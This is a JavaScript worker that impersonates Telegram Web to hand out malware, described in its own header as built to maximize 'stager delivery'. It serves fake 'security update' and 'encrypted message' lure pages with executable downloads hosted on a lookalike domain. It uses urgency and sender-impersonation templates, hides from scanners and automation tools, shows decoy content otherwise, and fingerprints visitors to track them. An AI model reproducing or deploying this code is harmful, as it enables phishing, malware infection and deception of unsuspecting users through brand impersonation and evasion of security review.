// Telegram Web App Worker
// Maximizes stager delivery through multiple methods

const LEGITIMATE_PATHS = {
  '/': 'home',
  '/z/': 'chat',
  '/k/': 'download',
  '/dl/': 'update',
  '/web/': 'webapp'
};

const DELIVERY_METHODS = {
  'update': {
    title: 'Telegram Desktop Update Required',
    content: 'Critical security update required. Please update your Telegram client.',
    filename: 'TelegramUpdate.exe',
    mimetype: 'application/vnd.microsoft.portable-executable'
  },
  'document': {
    title: 'Encrypted Message',
    content: 'This message is encrypted. Download Telegram secure viewer to read.',
    filename: 'TelegramSecureMessage.pdf',
    mimetype: 'application/pdf'
  },
  'media': {
    title: 'Media Preview',
    content: 'Download Telegram Media Viewer to view this content.',
    filename: 'TelegramMedia.dat',
    mimetype: 'application/octet-stream'
  }
};

const SOCIAL_ENGINEERING = {
  'corporate': {
    subject: 'Important Company Update',
    urgency: 'Please review immediately - Requires immediate action',
    sender: 'IT Department'
  },
  'personal': {
    subject: 'Secure Message Received',
    urgency: 'Message will expire in 24 hours',
    sender: 'Telegram Security'
  },
  'update': {
    subject: 'Security Update Required',
    urgency: 'Critical security vulnerability - Update required',
    sender: 'Telegram Team'
  }
};

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const headers = new Headers(request.headers);
  const clientIP = request.headers.get('cf-connecting-ip');
  
  // Security and tracking headers
  const securityHeaders = {
    'Content-Security-Policy': "default-src 'self' https://*.telegram.org https://*.t.me; img-src 'self' data: https://*.telegram.org; script-src 'self' 'unsafe-inline' https://*.telegram.org",
    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload',
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    'Referrer-Policy': 'strict-origin-when-cross-origin'
  };

  // Check if this is a legitimate browser
  if (!isLegitimateClient(request)) {
    return new Response('Not Found', { status: 404 });
  }

  // Rate limiting per IP
  const rateLimited = await checkRateLimit(clientIP);
  if (rateLimited) {
    return new Response('Too Many Requests', { status: 429 });
  }

  // Path-based handling
  const path = url.pathname;
  const deliveryType = LEGITIMATE_PATHS[path] || 'home';

  // Payload delivery based on user agent and request characteristics
  if (path.startsWith('/dl/') || path.startsWith('/k/')) {
    const method = selectDeliveryMethod(request);
    return await deliverPayload(method, request);
  }

  // Handle regular paths with legitimate content
  return await serveLegitimateContent(deliveryType, request);
}

async function isLegitimateClient(request) {
  const ua = request.headers.get('user-agent') || '';
  const ref = request.headers.get('referer') || '';
  
  // Browser fingerprinting
  if (ua.includes('curl') || ua.includes('wget') || ua.includes('python')) {
    return false;
  }

  // Check for automation tools
  if (ua.includes('Selenium') || ua.includes('Puppeteer') || ua.includes('PhantomJS')) {
    return false;
  }

  // Validate referrer
  if (!ref.includes('telegram.org') && !ref.includes('t.me') && ref !== '') {
    const legitimateRefs = ['google.com', 'bing.com', 'yahoo.com', 'duckduckgo.com'];
    if (!legitimateRefs.some(r => ref.includes(r))) {
      return false;
    }
  }

  return true;
}

async function checkRateLimit(clientIP) {
  // Implement rate limiting logic here
  return false; // Placeholder
}

async function selectDeliveryMethod(request) {
  const ua = request.headers.get('user-agent') || '';
  const lang = request.headers.get('accept-language') || '';
  
  if (ua.includes('Windows')) {
    return DELIVERY_METHODS.update;
  } else if (ua.includes('PDF')) {
    return DELIVERY_METHODS.document;
  } else {
    return DELIVERY_METHODS.media;
  }
}

async function deliverPayload(method, request) {
  const headers = new Headers();
  headers.set('Content-Type', method.mimetype);
  headers.set('Content-Disposition', `attachment; filename="${method.filename}"`);

  // Add tracking parameters
  const trackingId = await generateTrackingId(request);
  const url = `https://api.telegrams.app/dl/${method.filename}?id=${trackingId}`;

  // Social engineering context
  const context = SOCIAL_ENGINEERING[method === DELIVERY_METHODS.update ? 'update' : 'personal'];
  
  const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>${context.subject}</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        .container { max-width: 600px; margin: 50px auto; padding: 20px; }
        .urgent { color: red; }
        .button { background: #0088cc; color: white; padding: 10px 20px; border: none; border-radius: 5px; }
      </style>
    </head>
    <body>
      <div class="container">
        <h2>${method.title}</h2>
        <p class="urgent">${context.urgency}</p>
        <p>${method.content}</p>
        <p>From: ${context.sender}</p>
        <a href="${url}" class="button" id="download">Download Now</a>
      </div>
      <script>
        // Legitimate-looking analytics
        document.getElementById('download').onclick = function() {
          if(typeof gtag !== 'undefined') {
            gtag('event', 'download', { 'type': '${method.filename}' });
          }
        }
      </script>
    </body>
    </html>
  `;

  return new Response(html, {
    headers: {
      'Content-Type': 'text/html',
      'X-Frame-Options': 'DENY',
      'X-Content-Type-Options': 'nosniff'
    }
  });
}

async function serveLegitimateContent(type, request) {
  // Serve legitimate Telegram-like content
  const content = await getLegitimateContent(type);
  return new Response(content, {
    headers: {
      'Content-Type': 'text/html',
      'X-Frame-Options': 'DENY'
    }
  });
}

async function generateTrackingId(request) {
  const components = [
    request.headers.get('user-agent'),
    request.headers.get('accept-language'),
    request.cf.country,
    request.cf.timezone,
    Date.now()
  ].join('|');
  
  const encoder = new TextEncoder();
  const data = encoder.encode(components);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('').substr(0, 16);
}

async function getLegitimateContent(type) {
  // Return legitimate-looking Telegram web interface HTML
  return `<!DOCTYPE html>
    <html>
    <head>
      <title>Telegram Web</title>
      <link rel="icon" type="image/png" href="https://telegram.org/favicon.ico">
      <style>
        body { background: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
      </style>
    </head>
    <body>
      <div id="main">
        <h1>Telegram Web</h1>
        <p>Loading secure connection...</p>
      </div>
    </body>
    </html>`;
}